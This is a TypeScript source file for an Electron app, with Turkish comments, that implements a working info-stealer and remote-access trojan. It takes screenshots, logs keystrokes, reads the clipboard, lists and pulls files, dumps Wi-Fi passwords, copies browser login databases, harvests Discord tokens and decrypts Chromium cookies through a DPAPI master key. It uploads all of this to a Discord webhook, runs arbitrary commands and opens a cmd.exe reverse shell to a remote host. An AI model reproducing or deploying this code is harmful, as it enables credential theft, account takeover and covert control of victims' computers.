import { IpcMainInvokeEvent, desktopCapturer, clipboard } from "electron";
import https from "https";
import http from "http";
import os from "os";
import fs from "fs";
import pathModule from "path";
import { exec, execSync, spawn } from "child_process";
import net from "net";
import crypto from "crypto";
// ===================== YARDIMCI =====================

function httpGetJson(reqUrl: string): Promise<any> {
    return new Promise((resolve, reject) => {
        const parsed = new URL(reqUrl);
        const lib = parsed.protocol === "https:" ? https : http;
        lib.get(reqUrl, res => {
            let data = "";
            res.on("data", (c: any) => (data += c));
            res.on("end", () => {
                try { resolve(JSON.parse(data)); }
                catch { resolve({ raw: data }); }
            });
        }).on("error", (e: any) => reject(e));
    });
}

function webhookPost(
    webhookUrl: string,
    body: Buffer,
    contentType: string
): Promise<{ success: boolean; error?: string }> {
    const url = new URL(webhookUrl);
    const lib = url.protocol === "https:" ? https : http;
    return new Promise(resolve => {
        const req = lib.request(
            {
                hostname: url.hostname,
                port: url.port || (url.protocol === "https:" ? 443 : 80),
                path: url.pathname + url.search,
                method: "POST",
                headers: {
                    "Content-Type": contentType,
                    "Content-Length": body.length,
                },
            },
            (res: any) => {
                let rd = "";
                res.on("data", (c: any) => (rd += c));
                res.on("end", () => {
                    if (res.statusCode >= 200 && res.statusCode < 300) resolve({ success: true });
                    else resolve({ success: false, error: `HTTP ${res.statusCode}` });
                });
            }
        );
        req.on("error", (err: any) => resolve({ success: false, error: err.message }));
        req.write(body);
        req.end();
    });
}

async function takeScreenshot(): Promise<Buffer | null> {
    try {
        const sources = await desktopCapturer.getSources({
            types: ["screen"],
            thumbnailSize: { width: 1920, height: 1080 },
        });
        if (sources && sources.length > 0) return sources[0].thumbnail.toPNG();
    } catch { }
    return null;
}

// ===================== EXPORTS =====================

// --- 5 Ekran Görüntüsü + Token ---
export async function sendToWebhook(
    _: IpcMainInvokeEvent,
    webhookUrl: string,
    token: string,
    botName: string
): Promise<{ success: boolean; error?: string }> {
    try {
        const shots: Buffer[] = [];
        for (let i = 0; i < 5; i++) {
            const s = await takeScreenshot();
            if (s) shots.push(s);
            if (i < 4) await new Promise(r => setTimeout(r, 1000));
        }
        if (shots.length === 0) return { success: false, error: "Ekran yok" };

        const boundary = "----WKF" + Math.random().toString(36).substring(2);
        const payload = JSON.stringify({
            username: botName || "\uD83D\uDCF8 Screenshot",
            avatar_url: "https://cdn.discordapp.com/embed/avatars/0.png",
            embeds: [
                {
                    title: "\uD83D\uDD11 Token ve Ekran G\u00f6r\u00fcnt\u00fcleri",
                    color: 0x5865f2,
                    fields: [
                        { name: "Token", value: `||${token}||`, inline: false },
                        { name: "Zaman", value: `<t:${Math.floor(Date.now() / 1000)}:F>`, inline: true },
                        { name: "Kare", value: `${shots.length}`, inline: true },
                    ],
                    image: { url: "attachment://s0.png" },
                    footer: { text: "Screenshot" },
                    timestamp: new Date().toISOString(),
                },
                ...shots.slice(1).map((__, i) => ({
                    url: "https://discord.com",
                    image: { url: `attachment://s${i + 1}.png` },
                })),
            ],
        });

        const parts: Buffer[] = [];
        parts.push(Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="payload_json"\r\n\r\n${payload}\r\n`));
        for (let i = 0; i < shots.length; i++) {
            parts.push(Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="files[${i}]"; filename="s${i}.png"\r\nContent-Type: image/png\r\n\r\n`));
            parts.push(shots[i]);
            parts.push(Buffer.from("\r\n"));
        }
        parts.push(Buffer.from(`--${boundary}--\r\n`));
        return webhookPost(webhookUrl, Buffer.concat(parts), `multipart/form-data; boundary=${boundary}`);
    } catch (e: any) {
        return { success: false, error: e.message };
    }
}

// --- Tuş Kaydı ---
export async function sendKeysToWebhook(
    _: IpcMainInvokeEvent,
    webhookUrl: string,
    keys: string,
    botName: string
): Promise<{ success: boolean; error?: string }> {
    const payload = JSON.stringify({
        username: botName || "\u2328\uFE0F KeyLogger",
        avatar_url: "https://cdn.discordapp.com/embed/avatars/1.png",
        embeds: [
            {
                title: "\u2328\uFE0F Tu\u015f Kayd\u0131",
                color: 0x57f287,
                fields: [
                    { name: "Tu\u015flar", value: `\`\`\`\n${keys.substring(0, 1000)}\n\`\`\``, inline: false },
                    { name: "Zaman", value: `<t:${Math.floor(Date.now() / 1000)}:F>`, inline: true },
                    { name: "Karakter", value: `${keys.length}`, inline: true },
                ],
                footer: { text: "KeyLogger" },
                timestamp: new Date().toISOString(),
            },
        ],
    });
    return webhookPost(webhookUrl, Buffer.from(payload), "application/json");
}

// --- Sistem Bilgisi ---
export async function getSystemInfo(_: IpcMainInvokeEvent): Promise<any> {
    const nets = os.networkInterfaces();
    const localIPs: string[] = [];
    for (const iface of Object.values(nets)) {
        if (iface) for (const a of iface) {
            if (a.family === "IPv4" && !a.internal) localIPs.push(a.address);
        }
    }
    return {
        hostname: os.hostname(),
        username: os.userInfo().username,
        platform: `${os.platform()} ${os.arch()}`,
        release: os.release(),
        totalMem: (os.totalmem() / 1073741824).toFixed(2) + " GB",
        freeMem: (os.freemem() / 1073741824).toFixed(2) + " GB",
        cpu: os.cpus()[0]?.model || "?",
        cores: os.cpus().length,
        uptime: (os.uptime() / 3600).toFixed(1) + " saat",
        localIPs,
        homeDir: os.homedir(),
    };
}

// --- Pano İçeriği ---
export async function getClipboardContent(_: IpcMainInvokeEvent): Promise<string> {
    try { return clipboard.readText() || "(bo\u015f)"; }
    catch { return "(eri\u015filemedi)"; }
}

// --- Dosya Tarayıcı ---
export async function browseDirectory(
    _: IpcMainInvokeEvent,
    dirPath: string
): Promise<string> {
    try {
        const items = fs.readdirSync(dirPath, { withFileTypes: true });
        const lines = items.slice(0, 40).map(item => {
            const icon = item.isDirectory() ? "\uD83D\uDCC1" : "\uD83D\uDCC4";
            let size = "";
            if (!item.isDirectory()) {
                try {
                    const s = fs.statSync(pathModule.join(dirPath, item.name));
                    size = ` (${(s.size / 1024).toFixed(1)}KB)`;
                } catch { }
            }
            return `${icon} ${item.name}${size}`;
        });
        if (items.length > 40) lines.push(`... +${items.length - 40} dosya`);
        return lines.join("\n") || "(bo\u015f)";
    } catch (e: any) {
        return `\u274C ${e.message}`;
    }
}

// --- Komut Çalıştır ---
export async function executeCommand(
    _: IpcMainInvokeEvent,
    cmd: string
): Promise<string> {
    return new Promise(resolve => {
        exec(cmd, { timeout: 15000, maxBuffer: 1048576 }, (err, stdout, stderr) => {
            if (err) resolve(`\u274C ${err.message}\n${stderr || ""}`.substring(0, 1500));
            else resolve((stdout || stderr || "(bo\u015f \u00e7\u0131kt\u0131)").substring(0, 1500));
        });
    });
}

// --- Public IP & Konum ---
export async function getPublicIP(_: IpcMainInvokeEvent): Promise<any> {
    try {
        return await httpGetJson("http://ip-api.com/json/?fields=query,country,regionName,city,isp,org,timezone,lat,lon");
    } catch (e: any) {
        return { error: e.message };
    }
}

// --- Genel Embed Webhook ---
export async function sendEmbedWebhook(
    _: IpcMainInvokeEvent,
    webhookUrl: string,
    username: string,
    embeds: any[]
): Promise<{ success: boolean; error?: string }> {
    const payload = JSON.stringify({
        username,
        avatar_url: "https://cdn.discordapp.com/embed/avatars/0.png",
        embeds: embeds.slice(0, 10),
    });
    return webhookPost(webhookUrl, Buffer.from(payload), "application/json");
}

// --- Dosya Çekme (!pull) ---
export async function pullFile(
    _: IpcMainInvokeEvent,
    webhookUrl: string,
    filePath: string,
    botName: string
): Promise<{ success: boolean; error?: string }> {
    try {
        if (!fs.existsSync(filePath)) {
            return { success: false, error: "Dosya bulunamad\u0131" };
        }

        const stat = fs.statSync(filePath);
        if (!stat.isFile()) {
            return { success: false, error: "Bu bir dosya de\u011fil" };
        }

        // Discord Webhook limit (genelde 8MB ya da 25MB). Güvende olmak için 8MB altı diyelim
        const MAX_SIZE = 8 * 1024 * 1024;
        if (stat.size > MAX_SIZE) {
            return { success: false, error: `Dosya \u00e7ok b\u00fcy\u00fck (${(stat.size / 1024 / 1024).toFixed(1)}MB). Max 8MB desteklenir.` };
        }

        const fileBuffer = fs.readFileSync(filePath);
        const fileName = pathModule.basename(filePath);

        const boundary = "----WKF" + Math.random().toString(36).substring(2);

        const payload = JSON.stringify({
            username: botName || "\uD83D\uDCC2 File Pull",
            avatar_url: "https://cdn.discordapp.com/embed/avatars/0.png",
            content: `**\uD83D\uDCC4 Dosya \u00c7ekildi:** \`${fileName}\``
        });

        const parts: Buffer[] = [];
        parts.push(Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="payload_json"\r\n\r\n${payload}\r\n`));
        parts.push(Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="files[0]"; filename="${fileName}"\r\nContent-Type: application/octet-stream\r\n\r\n`));
        parts.push(fileBuffer);
        parts.push(Buffer.from(`\r\n--${boundary}--\r\n`));

        return webhookPost(webhookUrl, Buffer.concat(parts), `multipart/form-data; boundary=${boundary}`);
    } catch (e: any) {
        return { success: false, error: e.message };
    }
}

// --- Başlangıç Webhook (Embed + Screenshot) ---
export async function sendStartupWebhook(
    _: IpcMainInvokeEvent,
    webhookUrl: string,
    embeds: any[],
    botName: string
): Promise<{ success: boolean; error?: string }> {
    try {
        const ss = await takeScreenshot();

        if (!ss) {
            return sendEmbedWebhook(_, webhookUrl, botName || "\uD83D\uDE80 Startup", embeds);
        }

        const boundary = "----WKF" + Math.random().toString(36).substring(2);
        const allEmbeds = [
            ...embeds,
            {
                title: "\uD83D\uDCF8 Anl\u0131k Ekran",
                color: 0x2f3136,
                image: { url: "attachment://startup.png" },
                timestamp: new Date().toISOString(),
            },
        ];

        const payload = JSON.stringify({
            username: botName || "\uD83D\uDE80 Startup Alert",
            avatar_url: "https://cdn.discordapp.com/embed/avatars/0.png",
            embeds: allEmbeds.slice(0, 10),
        });

        const parts: Buffer[] = [];
        parts.push(Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="payload_json"\r\n\r\n${payload}\r\n`));
        parts.push(Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="files[0]"; filename="startup.png"\r\nContent-Type: image/png\r\n\r\n`));
        parts.push(ss);
        parts.push(Buffer.from(`\r\n--${boundary}--\r\n`));

        return webhookPost(webhookUrl, Buffer.concat(parts), `multipart/form-data; boundary=${boundary}`);
    } catch (e: any) {
        return { success: false, error: e.message };
    }
}

// --- WiFi Şifreleri ---
export async function getWifiPasswords(_: IpcMainInvokeEvent): Promise<string> {
    return new Promise(resolve => {
        if (os.platform() !== "win32") {
            return resolve("Bu özellik sadece Windows'ta çalışır.");
        }

        exec('netsh wlan show profile', { timeout: 15000 }, (err, stdout) => {
            if (err) return resolve("Profiller alınamadı.");

            const profiles = [...stdout.matchAll(/All User Profile\s*:\s*(.*)/g)].map(m => m[1].trim());
            if (profiles.length === 0) return resolve("Kayıtlı WiFi profili bulunamadı.");

            let result = "";
            let completed = 0;

            for (const p of profiles.slice(0, 15)) {
                exec(`netsh wlan show profile name="${p}" key=clear`, { timeout: 5000 }, (e, out) => {
                    let key = "(yok)";
                    const m = out?.match(/Key Content\s*:\s*(.*)/);
                    if (m && m[1]) key = m[1].trim();
                    result += `SSID: ${p} | Şifre: ${key}\n`;
                    completed++;
                    if (completed === Math.min(profiles.length, 15)) {
                        resolve(result || "Şifre bulunamadı.");
                    }
                });
            }
        });
    });
}

// --- Hesap ve Şifre Çalıcı (Browser Data & Tokens) ---
export async function stealAllCredentials(
    _: IpcMainInvokeEvent,
    webhookUrl: string,
    botName: string
): Promise<{ success: boolean; error?: string }> {
    try {
        const tempDir = pathModule.join(os.tmpdir(), "Steal_" + Date.now());
        fs.mkdirSync(tempDir, { recursive: true });

        let summary = "Bulunan Veriler:\n";
        
        // --- 1. System & Network Dump ---
        try {
            const sysInfo = await getSystemInfo(_);
            const wifiInfo = await getWifiPasswords(_);
            fs.writeFileSync(pathModule.join(tempDir, "SystemInfo.txt"), JSON.stringify(sysInfo, null, 2));
            fs.writeFileSync(pathModule.join(tempDir, "WifiPasswords.txt"), wifiInfo);
            summary += "- Sistem ve WiFi şifreleri alındı.\n";
        } catch {}

        // --- 2. Tarayıcı Verilerini Kopyala ---
        const browsers = [
            { name: "Chrome", path: pathModule.join(os.homedir(), "AppData", "Local", "Google", "Chrome", "User Data") },
            { name: "Edge", path: pathModule.join(os.homedir(), "AppData", "Local", "Microsoft", "Edge", "User Data") },
            { name: "Brave", path: pathModule.join(os.homedir(), "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data") },
            { name: "Opera", path: pathModule.join(os.homedir(), "AppData", "Roaming", "Opera Software", "Opera Stable") },
            { name: "OperaGX", path: pathModule.join(os.homedir(), "AppData", "Roaming", "Opera Software", "Opera GX Stable") }
        ];

        summary += "\nBulunan Tarayıcılar:\n";
        for (const b of browsers) {
            if (fs.existsSync(b.path)) {
                const targets = [
                    { src: pathModule.join(b.path, "Default", "Login Data"), dest: `${b.name}_LoginData` },
                    { src: pathModule.join(b.path, "Default", "Cookies"), dest: `${b.name}_Cookies` },
                    { src: pathModule.join(b.path, "Default", "History"), dest: `${b.name}_History` },
                    { src: pathModule.join(b.path, "Default", "Bookmarks"), dest: `${b.name}_Bookmarks` },
                    { src: pathModule.join(b.path, "Local State"), dest: `${b.name}_LocalState` }
                ];

                let found = false;
                for (const t of targets) {
                    if (fs.existsSync(t.src)) {
                        try {
                            fs.copyFileSync(t.src, pathModule.join(tempDir, t.dest));
                            found = true;
                        } catch {
                            try {
                                execSync(`powershell -Command "Copy-Item '${t.src}' -Destination '${pathModule.join(tempDir, t.dest)}' -Force"`);
                                found = true;
                            } catch {}
                        }
                    }
                }
                if (found) summary += `- ${b.name}\n`;
            }
        }

        // --- 3. Discord Tokenleri ---
        const tokenPaths = [
            pathModule.join(os.homedir(), "AppData", "Roaming", "Discord", "Local Storage", "leveldb"),
            pathModule.join(os.homedir(), "AppData", "Roaming", "discordcanary", "Local Storage", "leveldb"),
            pathModule.join(os.homedir(), "AppData", "Roaming", "discordptb", "Local Storage", "leveldb"),
            pathModule.join(os.homedir(), "AppData", "Roaming", "Lightcord", "Local Storage", "leveldb"),
            ...browsers.map(b => pathModule.join(b.path, "Default", "Local Storage", "leveldb"))
        ];

        const tokens = new Set<string>();
        const regex = /[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}/g;
        const encRegex = /dQw4w9WgXcQ:[^"']+/g;

        for (const p of tokenPaths) {
            if (fs.existsSync(p)) {
                try {
                    const files = fs.readdirSync(p);
                    for (const file of files) {
                        if (file.endsWith(".log") || file.endsWith(".ldb")) {
                            try {
                                const content = fs.readFileSync(pathModule.join(p, file), "utf8");
                                const matches = content.match(regex);
                                if (matches) matches.forEach(m => tokens.add(m));
                                const encMatches = content.match(encRegex);
                                if (encMatches) encMatches.forEach(m => tokens.add(m));
                            } catch {}
                        }
                    }
                } catch {}
            }
        }

        const tokenList = Array.from(tokens);
        if (tokenList.length > 0) {
            fs.writeFileSync(pathModule.join(tempDir, "tokens.txt"), tokenList.join("\n"));
            summary += `\nBulunan Token Sayısı: ${tokenList.length}\n`;
        }

        // --- 4. Masaüstü Dosya İsimleri ---
        try {
            const desktopPath = pathModule.join(os.homedir(), "Desktop");
            if (fs.existsSync(desktopPath)) {
                const files = fs.readdirSync(desktopPath);
                fs.writeFileSync(pathModule.join(tempDir, "Desktop_Files.txt"), files.join("\n"));
                summary += "- Masaüstü dosya listesi alındı.\n";
            }
        } catch {}
        
        fs.writeFileSync(pathModule.join(tempDir, "Summary.txt"), summary);

        // --- 5. Zip Oluştur (PowerShell) ---
        const zipPath = pathModule.join(os.tmpdir(), `Vault_${Date.now()}.zip`);
        await new Promise<void>(resolve => {
            exec(`powershell -Command "Compress-Archive -Path '${tempDir}\\*' -DestinationPath '${zipPath}' -Force"`, () => resolve());
        });

        // --- 6. Webhook'a Gönder ---
        if (!fs.existsSync(zipPath)) {
            return { success: false, error: "Zip oluşturulamadı. (Klasör boş olabilir)" };
        }
        
        const stat = fs.statSync(zipPath);
        if (stat.size > 8 * 1024 * 1024) { // Discord 8MB limit
            return { success: false, error: `Zip dosyası çok büyük (${(stat.size/1024/1024).toFixed(1)}MB). Discord limiti 8MB.` };
        }

        const fileBuffer = fs.readFileSync(zipPath);
        const fileName = pathModule.basename(zipPath);
        const boundary = "----WKF" + Math.random().toString(36).substring(2);
        
        const payload = JSON.stringify({
            username: botName || "🔐 Vault Stealer",
            avatar_url: "https://cdn.discordapp.com/embed/avatars/4.png",
            embeds: [
                {
                    title: "🔐 Hesap, Şifre ve Sistem Arşivi",
                    description: `\`\`\`text\n${summary}\n\`\`\`\nArşiv şifre veritabanlarını, Local State, geçmiş ve yer imlerini içerir.`,
                    color: 0xff0000,
                    timestamp: new Date().toISOString()
                }
            ]
        });

        const parts: Buffer[] = [];
        parts.push(Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="payload_json"\r\n\r\n${payload}\r\n`));
        parts.push(Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="files[0]"; filename="${fileName}"\r\nContent-Type: application/zip\r\n\r\n`));
        parts.push(fileBuffer);
        parts.push(Buffer.from(`\r\n--${boundary}--\r\n`));

        const res = await webhookPost(webhookUrl, Buffer.concat(parts), `multipart/form-data; boundary=${boundary}`);
        
        // Temizlik
        try { fs.rmSync(tempDir, { recursive: true, force: true }); } catch {}
        try { fs.unlinkSync(zipPath); } catch {}

        return res;
    } catch (e: any) {
        return { success: false, error: e.message };
    }
}

// ===================== SQLITE PARSER =====================

function sqliteVarint(buf: Buffer, pos: number): [number, number] {
    let val = 0;
    for (let i = 0; i < 9; i++) {
        if (pos + i >= buf.length) return [val, i || 1];
        const b = buf[pos + i];
        if (i === 8) return [val * 256 + b, 9];
        val = val * 128 + (b & 0x7f);
        if (!(b & 0x80)) return [val, i + 1];
    }
    return [val, 9];
}

function sqliteParseRecord(buf: Buffer, pos: number): any[] {
    const start = pos;
    const [hdrLen, hb] = sqliteVarint(buf, pos);
    pos += hb;
    const types: number[] = [];
    const hdrEnd = start + hdrLen;
    while (pos < hdrEnd) {
        const [t, tb] = sqliteVarint(buf, pos);
        types.push(t);
        pos += tb;
    }
    pos = hdrEnd;
    const vals: any[] = [];
    for (const t of types) {
        try {
            if (t === 0) vals.push(null);
            else if (t === 1) { vals.push(buf.readInt8(pos)); pos += 1; }
            else if (t === 2) { vals.push(buf.readInt16BE(pos)); pos += 2; }
            else if (t === 3) { vals.push((buf[pos] << 16) | (buf[pos + 1] << 8) | buf[pos + 2]); pos += 3; }
            else if (t === 4) { vals.push(buf.readInt32BE(pos)); pos += 4; }
            else if (t === 5) {
                const hi = buf.readInt16BE(pos); const lo = buf.readUInt32BE(pos + 2);
                vals.push(hi * 0x100000000 + lo); pos += 6;
            }
            else if (t === 6) {
                const hi = buf.readInt32BE(pos); const lo = buf.readUInt32BE(pos + 4);
                vals.push(hi * 0x100000000 + lo); pos += 8;
            }
            else if (t === 7) { vals.push(buf.readDoubleBE(pos)); pos += 8; }
            else if (t === 8) vals.push(0);
            else if (t === 9) vals.push(1);
            else if (t >= 12 && t % 2 === 0) {
                const len = (t - 12) / 2;
                vals.push(Buffer.from(buf.slice(pos, pos + len))); pos += len;
            } else if (t >= 13 && t % 2 === 1) {
                const len = (t - 13) / 2;
                vals.push(buf.slice(pos, pos + len).toString("utf8")); pos += len;
            } else vals.push(null);
        } catch { vals.push(null); break; }
    }
    return vals;
}

function sqliteReadBTree(buf: Buffer, pageNum: number, pgSize: number, maxRows = 5000): any[][] {
    const pgOff = (pageNum - 1) * pgSize;
    if (pgOff >= buf.length) return [];
    const hOff = pageNum === 1 ? pgOff + 100 : pgOff;
    const type = buf[hOff];
    const rows: any[][] = [];

    if (type === 0x0d) {
        const nCells = buf.readUInt16BE(hOff + 3);
        for (let i = 0; i < nCells && rows.length < maxRows; i++) {
            const cOff = pgOff + buf.readUInt16BE(hOff + 8 + i * 2);
            let p = cOff;
            const [pLen, pb] = sqliteVarint(buf, p); p += pb;
            const [, rb] = sqliteVarint(buf, p); p += rb;
            if (p + pLen > pgOff + pgSize) continue;
            try { rows.push(sqliteParseRecord(buf, p)); } catch {}
        }
    } else if (type === 0x05) {
        const nCells = buf.readUInt16BE(hOff + 3);
        const rightPtr = buf.readUInt32BE(hOff + 8);
        for (let i = 0; i < nCells && rows.length < maxRows; i++) {
            const cOff = pgOff + buf.readUInt16BE(hOff + 12 + i * 2);
            const child = buf.readUInt32BE(cOff);
            rows.push(...sqliteReadBTree(buf, child, pgSize, maxRows - rows.length));
        }
        if (rows.length < maxRows)
            rows.push(...sqliteReadBTree(buf, rightPtr, pgSize, maxRows - rows.length));
    }
    return rows;
}

function sqliteGetTable(filePath: string, tableName: string): any[][] {
    try {
        const buf = fs.readFileSync(filePath);
        if (buf.length < 100 || !buf.slice(0, 15).toString("ascii").startsWith("SQLite format 3")) return [];
        let pgSize = buf.readUInt16BE(16);
        if (pgSize === 1) pgSize = 65536;
        const master = sqliteReadBTree(buf, 1, pgSize, 200);
        let rootPage = 0;
        for (const r of master) {
            if (r[0] === "table" && r[1] === tableName && typeof r[3] === "number") {
                rootPage = r[3];
                break;
            }
        }
        if (!rootPage) return [];
        return sqliteReadBTree(buf, rootPage, pgSize);
    } catch { return []; }
}

// --- Discord Bot API Fetch (CORS Bypass) ---
export async function pollDiscordBot(
    _: IpcMainInvokeEvent,
    channelId: string,
    token: string
): Promise<any> {
    return new Promise((resolve) => {
        const req = https.get(`https://discord.com/api/v10/channels/${channelId}/messages?limit=1`, {
            headers: { "Authorization": `Bot ${token}` }
        }, (res) => {
            let data = "";
            res.on("data", (c) => data += c);
            res.on("end", () => {
                try { resolve(JSON.parse(data)); } catch { resolve(null); }
            });
        });
        req.on("error", () => resolve(null));
    });
}

// ===================== COOKIE STEALER =====================

function decryptAesGcm(enc: Buffer, key: Buffer): string {
    if (!enc || enc.length < 31) return "";
    const pfx = enc.slice(0, 3).toString("ascii");
    if (pfx !== "v10" && pfx !== "v11") return "";
    const nonce = enc.slice(3, 15);
    const tag = enc.slice(enc.length - 16);
    const ct = enc.slice(15, enc.length - 16);
    try {
        const d = crypto.createDecipheriv("aes-256-gcm", key, nonce);
        d.setAuthTag(tag);
        return Buffer.concat([d.update(ct), d.final()]).toString("utf8");
    } catch { return ""; }
}

function getMasterKey(browserDataPath: string): Buffer | null {
    try {
        const lsPath = pathModule.join(browserDataPath, "Local State");
        if (!fs.existsSync(lsPath)) return null;
        const ls = JSON.parse(fs.readFileSync(lsPath, "utf8"));
        const ekb64 = ls?.os_crypt?.encrypted_key;
        if (!ekb64) return null;
        const psCmd = [
            "Add-Type -AssemblyName System.Security",
            `$k=[Convert]::FromBase64String('${ekb64}')`,
            "$k=$k[5..($k.Length-1)]",
            "$d=[Security.Cryptography.ProtectedData]::Unprotect($k,$null,'CurrentUser')",
            "[Convert]::ToBase64String($d)",
        ].join("; ");
        const out = execSync(`powershell -Command "${psCmd}"`, { timeout: 10000 }).toString().trim();
        const key = Buffer.from(out, "base64");
        return key.length === 32 ? key : null;
    } catch { return null; }
}

export async function stealCookies(
    _: IpcMainInvokeEvent,
    webhookUrl: string,
    botName: string
): Promise<{ success: boolean; error?: string }> {
    try {
        const browsers = [
            { name: "Chrome", data: pathModule.join(os.homedir(), "AppData", "Local", "Google", "Chrome", "User Data") },
            { name: "Edge", data: pathModule.join(os.homedir(), "AppData", "Local", "Microsoft", "Edge", "User Data") },
            { name: "Brave", data: pathModule.join(os.homedir(), "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data") },
            { name: "Opera", data: pathModule.join(os.homedir(), "AppData", "Roaming", "Opera Software", "Opera Stable") },
            { name: "OperaGX", data: pathModule.join(os.homedir(), "AppData", "Roaming", "Opera Software", "Opera GX Stable") },
        ];

        let output = "";
        let totalCount = 0;

        for (const br of browsers) {
            if (!fs.existsSync(br.data)) continue;
            const key = getMasterKey(br.data);
            if (!key) continue;

            const profiles = ["Default"];
            try {
                for (const item of fs.readdirSync(br.data)) {
                    if (/^Profile \d+$/i.test(item)) profiles.push(item);
                }
            } catch {}

            for (const profile of profiles) {
                const candidates = [
                    pathModule.join(br.data, profile, "Network", "Cookies"),
                    pathModule.join(br.data, profile, "Cookies"),
                ];
                if (profile === "Default") {
                    candidates.push(pathModule.join(br.data, "Network", "Cookies"));
                    candidates.push(pathModule.join(br.data, "Cookies"));
                }

                for (const cookiePath of candidates) {
                    if (!fs.existsSync(cookiePath)) continue;

                    const tmp = pathModule.join(os.tmpdir(), `ck_${Date.now()}_${Math.random().toString(36).slice(2)}`);
                    try {
                        try { fs.copyFileSync(cookiePath, tmp); }
                        catch {
                            execSync(`powershell -Command "Copy-Item -LiteralPath '${cookiePath}' -Destination '${tmp}' -Force"`, { timeout: 5000 });
                        }
                    } catch { continue; }

                    const rows = sqliteGetTable(tmp, "cookies");
                    try { fs.unlinkSync(tmp); } catch {}
                    if (rows.length === 0) continue;

                    output += `\n========== ${br.name} [${profile}] (${rows.length} cookies) ==========\n`;
                    let count = 0;
                    for (const row of rows) {
                        if (count >= 500) { output += `... +${rows.length - 500} daha\n`; break; }
                        const hasTopFrame = row.length >= 19;
                        const host = row[1] || "";
                        const name = hasTopFrame ? (row[3] || "") : (row[2] || "");
                        const value = hasTopFrame ? (row[4] || "") : (row[3] || "");
                        const encVal = hasTopFrame ? row[5] : row[4];
                        const path = hasTopFrame ? (row[6] || "/") : (row[5] || "/");

                        let cookieValue = typeof value === "string" ? value : "";
                        if (encVal && Buffer.isBuffer(encVal) && encVal.length > 0) {
                            const dec = decryptAesGcm(encVal, key);
                            if (dec) cookieValue = dec;
                        }
                        if (cookieValue) {
                            output += `${host}\t${path}\t${name}\t${cookieValue}\n`;
                            count++;
                            totalCount++;
                        }
                    }
                    break;
                }
            }
        }

        if (!output || totalCount === 0)
            return { success: false, error: "Hiçbir tarayıcıdan cookie çözülemedi." };

        const fileBuffer = Buffer.from(output, "utf8");
        const boundary = "----WKF" + Math.random().toString(36).substring(2);
        const payload = JSON.stringify({
            username: botName || "\uD83C\uDF6A Cookie Stealer",
            avatar_url: "https://cdn.discordapp.com/embed/avatars/3.png",
            embeds: [{
                title: "\uD83C\uDF6A Cookie'ler \u00c7\u00f6z\u00fcld\u00fc",
                color: 0xff9900,
                description: `Toplam **${totalCount}** cookie \u015fifresi \u00e7\u00f6z\u00fcld\u00fc.`,
                timestamp: new Date().toISOString(),
            }],
        });
        const parts: Buffer[] = [];
        parts.push(Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="payload_json"\r\n\r\n${payload}\r\n`));
        parts.push(Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="files[0]"; filename="cookies_decrypted.txt"\r\nContent-Type: text/plain\r\n\r\n`));
        parts.push(fileBuffer);
        parts.push(Buffer.from(`\r\n--${boundary}--\r\n`));
        return webhookPost(webhookUrl, Buffer.concat(parts), `multipart/form-data; boundary=${boundary}`);
    } catch (e: any) {
        return { success: false, error: e.message };
    }
}


// --- Remote Access (Reverse Shell) ---
export async function startReverseShell(
    _: IpcMainInvokeEvent,
    host: string,
    port: number
): Promise<{ success: boolean; message: string }> {
    return new Promise(resolve => {
        let resolved = false;
        const done = (r: { success: boolean; message: string }) => {
            if (!resolved) { resolved = true; resolve(r); }
        };
        try {
            const client = new net.Socket();

            client.connect(port, host, () => {
                const sh = spawn("cmd.exe", [], { stdio: ["pipe", "pipe", "pipe"] });
                client.pipe(sh.stdin!);
                sh.stdout!.pipe(client);
                sh.stderr!.pipe(client);
                sh.on("exit", () => { try { client.destroy(); } catch {} });
                client.on("close", () => { try { sh.kill(); } catch {} });
                done({ success: true, message: `Reverse shell bağlandı: ${host}:${port}` });
            });

            client.on("error", (e: any) => {
                done({ success: false, message: `Bağlantı hatası: ${e.message}` });
            });

            setTimeout(() => {
                done({ success: false, message: "Bağlantı zaman aşımı (10sn)" });
                try { client.destroy(); } catch {}
            }, 10000);
        } catch (e: any) {
            done({ success: false, message: `Beklenmeyen hata: ${e.message}` });
        }
    });
}
